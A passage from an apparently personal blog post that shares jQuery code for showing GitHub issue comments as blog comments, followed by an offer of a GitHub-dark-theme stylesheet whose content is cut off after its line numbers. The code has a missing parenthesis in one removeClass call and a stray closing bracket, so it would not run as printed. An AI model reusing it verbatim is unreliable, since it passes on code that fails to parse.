</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#8be9fd;font-style:italic">var</span> repo_name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;0xade1/0xade1.github.io&#34;</span>;
<span style="color:#8be9fd;font-style:italic">var</span> CurrentPage <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;

<span style="color:#8be9fd;font-style:italic">function</span> ParseLinkHeader(link) {
  <span style="color:#8be9fd;font-style:italic">var</span> entries <span style="color:#ff79c6">=</span> link.split(<span style="color:#f1fa8c">&#34;,&#34;</span>);
  <span style="color:#8be9fd;font-style:italic">var</span> links <span style="color:#ff79c6">=</span> {};
  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">var</span> i <span style="color:#ff79c6">in</span> entries) {
    <span style="color:#8be9fd;font-style:italic">var</span> entry <span style="color:#ff79c6">=</span> entries[i];
    <span style="color:#8be9fd;font-style:italic">var</span> link <span style="color:#ff79c6">=</span> {};
    link.name <span style="color:#ff79c6">=</span> entry.match(<span style="color:#f1fa8c">/rel=\&#34;([^\&#34;]*)/</span>)[<span style="color:#bd93f9">1</span>];
    link.url <span style="color:#ff79c6">=</span> entry.match(<span style="color:#f1fa8c">/&lt;([^&gt;]*)/</span>)[<span style="color:#bd93f9">1</span>];
    link.page <span style="color:#ff79c6">=</span> entry.match(<span style="color:#f1fa8c">/page=(\d+).*$/</span>)[<span style="color:#bd93f9">1</span>];
    links[link.name] <span style="color:#ff79c6">=</span> link;
  }
  <span style="color:#ff79c6">return</span> links;
}
<span style="color:#8be9fd;font-style:italic">function</span> DoGithubComments(comment_id, page_id) {
  <span style="color:#ff79c6">if</span> (comment_id <span style="color:#ff79c6">===</span> <span style="color:#ff79c6">null</span>) {
    $(<span style="color:#f1fa8c">&#34;#gh-comments-list&#34;</span>).append(<span style="color:#f1fa8c">&#34;Comments are not open for this post yet.&#34;</span>);
    $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).removeClass(<span style="color:#f1fa8c">&#34;button&#34;</span>;
    $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).hide();
    <span style="color:#ff79c6">return</span>;
  }

  <span style="color:#ff79c6">if</span> (page_id <span style="color:#ff79c6">===</span> <span style="color:#ff79c6">undefined</span>) page_id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;

  <span style="color:#8be9fd;font-style:italic">var</span> api_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://api.github.com/repos/&#34;</span> <span style="color:#ff79c6">+</span> repo_name;
  <span style="color:#8be9fd;font-style:italic">var</span> api_issue_url <span style="color:#ff79c6">=</span> api_url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/issues/&#34;</span> <span style="color:#ff79c6">+</span> comment_id;
  <span style="color:#8be9fd;font-style:italic">var</span> api_comments_url <span style="color:#ff79c6">=</span>
    api_url <span style="color:#ff79c6">+</span>
    <span style="color:#f1fa8c">&#34;/issues/&#34;</span> <span style="color:#ff79c6">+</span>
    comment_id <span style="color:#ff79c6">+</span>
    <span style="color:#f1fa8c">&#34;/comments&#34;</span> <span style="color:#ff79c6">+</span>
    <span style="color:#f1fa8c">&#34;?per_page=10&amp;page=&#34;</span> <span style="color:#ff79c6">+</span>
    page_id;

  <span style="color:#8be9fd;font-style:italic">var</span> url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://github.com/&#34;</span> <span style="color:#ff79c6">+</span> repo_name <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/issues/&#34;</span> <span style="color:#ff79c6">+</span> comment_id;

  $(<span style="color:#8be9fd;font-style:italic">document</span>).ready(<span style="color:#8be9fd;font-style:italic">function</span> () {
    console.log(api_issue_url);
    $.ajax({
      type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;GET&#34;</span>,
      url<span style="color:#ff79c6">:</span> api_issue_url,
      <span style="color:#6272a4">//data:{ get_param: &#39;&#39; },
</span><span style="color:#6272a4"></span>      dataType<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;json&#34;</span>,
      success<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">function</span> (data) {
        NbComments <span style="color:#ff79c6">=</span> data.comments;
      },
    });
    $.ajax(api_comments_url, {
      headers<span style="color:#ff79c6">:</span> { Accept<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;application/vnd.github.v3.html+json&#34;</span> },
      dataType<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;json&#34;</span>,
      success<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">function</span> (comments, textStatus, jqXHR) {
        <span style="color:#6272a4">// Add post button to first page
</span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (page_id <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>)
          $(<span style="color:#f1fa8c">&#34;#gh-comments-list&#34;</span>).append(
            <span style="color:#f1fa8c">&#34;&lt;a href=&#39;&#34;</span> <span style="color:#ff79c6">+</span>
              url <span style="color:#ff79c6">+</span>
              <span style="color:#f1fa8c">&#34;#new_comment_field&#39; rel=&#39;nofollow&#39;&gt;&lt;span style=&#39;width: auto;&#39; class=&#39;button&#39;&gt;Post a comment on Github&lt;/span&gt;&lt;/a&gt;&#34;</span>
          );
        <span style="color:#6272a4">// Individual comments
</span><span style="color:#6272a4"></span>        $.each(comments, <span style="color:#8be9fd;font-style:italic">function</span> (i, comment) {
          <span style="color:#8be9fd;font-style:italic">var</span> date <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>(comment.created_at);
          <span style="color:#8be9fd;font-style:italic">var</span> t <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&lt;div id=&#39;gh-comment&#39;&gt;&#34;</span>;
          t <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;img src=&#39;&#34;</span> <span style="color:#ff79c6">+</span> comment.user.avatar_url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&#39; width=&#39;24px&#39;&gt;&#34;</span>;
          t <span style="color:#ff79c6">+=</span>
            <span style="color:#f1fa8c">&#34;&lt;b&gt;&lt;a href=&#39;&#34;</span> <span style="color:#ff79c6">+</span>
            comment.user.html_url <span style="color:#ff79c6">+</span>
            <span style="color:#f1fa8c">&#34;&#39;&gt;&#34;</span> <span style="color:#ff79c6">+</span>
            comment.user.login <span style="color:#ff79c6">+</span>
            <span style="color:#f1fa8c">&#34;&lt;/a&gt;&lt;/b&gt;&#34;</span>;
          t <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34; posted at &#34;</span>;
          t <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;em&gt;&#34;</span> <span style="color:#ff79c6">+</span> date.toUTCString() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&lt;/em&gt;&#34;</span>;
          t <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;div id=&#39;gh-comment-hr&#39;&gt;&lt;/div&gt;&#34;</span>;
          t <span style="color:#ff79c6">+=</span> comment.body_html;
          t <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;/div&gt;&#34;</span>;
          $(<span style="color:#f1fa8c">&#34;#gh-comments-list&#34;</span>).append(t);
        });
        <span style="color:#6272a4">// Setup comments button if there are more pages to display
</span><span style="color:#6272a4"></span>        link <span style="color:#ff79c6">=</span> jqXHR.getResponseHeader(<span style="color:#f1fa8c">&#34;Link&#34;</span>);
        <span style="color:#ff79c6">if</span> (link <span style="color:#ff79c6">===</span> <span style="color:#ff79c6">null</span>) {
          $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).removeClass(<span style="color:#f1fa8c">&#34;button&#34;</span>);
          $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).hide();
          <span style="color:#ff79c6">return</span>;
        }
        <span style="color:#8be9fd;font-style:italic">var</span> links <span style="color:#ff79c6">=</span> ParseLinkHeader(link);
        <span style="color:#ff79c6">if</span> (<span style="color:#f1fa8c">&#34;next&#34;</span> <span style="color:#ff79c6">in</span> links) {
          $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).attr(
            <span style="color:#f1fa8c">&#34;onclick&#34;</span>,
            <span style="color:#f1fa8c">&#34;DoGithubComments(&#34;</span> <span style="color:#ff79c6">+</span> comment_id <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;,&#34;</span> <span style="color:#ff79c6">+</span> (page_id <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;);&#34;</span>
          );
          $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).addClass(<span style="color:#f1fa8c">&#34;button&#34;</span>);
          $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).show();
        } <span style="color:#ff79c6">else</span> {
          $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).removeClass(<span style="color:#f1fa8c">&#34;button&#34;</span>);
          $(<span style="color:#f1fa8c">&#34;#gh-load-comments&#34;</span>).hide();
        }
      },
      error<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">function</span> (xhr) {
        $(<span style="color:#f1fa8c">&#34;#gh-comments-list&#34;</span>).append(
          <span style="color:#f1fa8c">&#34;Comments are not open for this post yet.&#34;</span> <span style="color:#ff79c6">+</span> xhr.status
        );
      },
    });
  });
}
)
</code></pre></td></tr></table>
</div>
</div><p>maybe a css stylesheet to have it fit with your theme design.
I personnally love github dark theme so I spent time, effort and love to reproduce it.
Feel free to make it your own, as I would love to see your site with my preferred themes.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">178
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">183
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">184
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">185
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">186
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">187
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">188
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">189
